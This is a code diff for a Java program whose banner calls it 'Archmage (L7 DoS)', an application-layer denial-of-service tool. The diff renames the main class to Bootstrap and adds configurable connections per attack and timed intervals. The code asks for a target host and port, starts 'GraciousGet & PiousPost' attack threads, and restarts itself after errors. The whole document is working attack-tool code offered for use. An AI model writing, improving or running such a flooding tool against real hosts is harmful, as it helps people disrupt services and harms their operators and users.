@@ -6,29 +6,32 @@ import java.net.Socket;
 import java.net.UnknownHostException;
 import java.util.Scanner;
 
+import m3rlin.ut1ls.Params;
+
 import org.apache.log4j.Logger;
 
-public class Archmage {
+public class Bootstrap {
 
-	private static Logger log = Logger.getLogger(Archmage.class);
+	private static Logger log = Logger.getLogger(Bootstrap.class);
 	private static final String STOP_ATTACK = "STOP";
 	private static final String EXIT_ARCHMAGE = "EXIT";
 
 	Executioner executioner;
-	
+
 	private Socket socket;
 	private Scanner console;
 	private String host;
 	private int port;
-	
+	private int connections;
+	private int interval;
+
 	public void start() {
-		try {				
-			console = new Scanner(System.in);
+		try {
 			System.out.print("\n>> Establishing connection to " + host + ":" + port + "...");
 			socket = new Socket(host, port);
 			System.out.print("\n>> Connection established...");
 			System.out.print("\n>> Begninning GraciousGet & PiousPost attacks...\n\n");
-			executioner = new Executioner(host, port);
+			executioner = new Executioner(host, port, connections, interval);
 			executioner.start();
 			while (executioner.isRunning()) {
 				if(console.hasNextLine()) {
@@ -53,39 +56,36 @@ public class Archmage {
 		} catch (IOException e) {
 			System.out.print("\n>> Error acquiring socket connection (IOException)\n");
 		}
+		// Restart the application
+		init();
+		start();
 	}
-	
+
 	public void stop() throws IOException {
 		log.info("Stopping attack...");
 		executioner.stop();
 		socket.close();
 		log.info("Attack stopped...\n");
 	}
-	
+
 	public void exit() throws IOException {
 		stop();
 		log.info("Exiting...");
 		System.exit(0);
 	}
-	
+
 	public void init() {
 		console = new Scanner(System.in);
-		System.out.print("\nEnter target (IP or host): ");
-		host = console.nextLine();
-		try {
-			System.out.print("Enter port (Default: 80): ");
-			String portStr = console.nextLine();
-			if (portStr == null || portStr.length() == 0) {
-				port = 80;
-			} else {
-				port = Integer.parseInt(portStr);
-			}
-		} catch (NumberFormatException e) {		
-			System.out.print("\n>> Port numbers can't contain non-numeric characters\n");
-			init();
-		}		
+		System.out.print("\nEnter target IP or host (Default: localhost): ");
+		host = Params.getString(console.nextLine(), "localhost");
+		System.out.print("Enter target port (Default: 80): ");
+		port = Params.getInt(console.nextLine(), 80);
+		System.out.print("Number of connections per attack (Default: 150): ");
+		connections = Params.getInt(console.nextLine(), 150);
+		System.out.print("Sleep timed attacks for N milliseconds (Default: 2000): ");
+		interval = Params.getInt(console.nextLine(), 2000);
 	}
-	
+
 	public void printSummary() {
 		System.out.print("\n>> +------------------------------+");
 		System.out.print("\n>> | ATTACK THREADS / CONNECTIONS |");
@@ -105,7 +105,7 @@ public class Archmage {
 		System.out.print("\n>>      |----PiousPost (" + executioner.getPiousTaskCount() + ")");
 		System.out.print("\n>>      |--GraciousGet (" + executioner.getGraciousTaskCount() + ")\n\n");
 	}
-	
+
 	public static void main(String[] args) {
 		System.out.print("+-------------------+\n");
 		System.out.print("| Archmage (L7 DoS) |\n");
@@ -113,10 +113,8 @@ public class Archmage {
 		System.out.print("\nCommands:\"stop\" - Stops the attack; waits for each scheduled thread to complete");
 		System.out.print("\n          \"exit\" - Performs a stop action, then exits the application");
 		System.out.print("\n          \"[enter]\" - Press enter while attacking to check status (won't affect the attack)\n");		
-		Archmage archmage = new Archmage();
-		while(true) {
-			archmage.init();
-			archmage.start();	
-		}
+		Bootstrap archmage = new Bootstrap();
+		archmage.init();
+		archmage.start();
 	}
 }
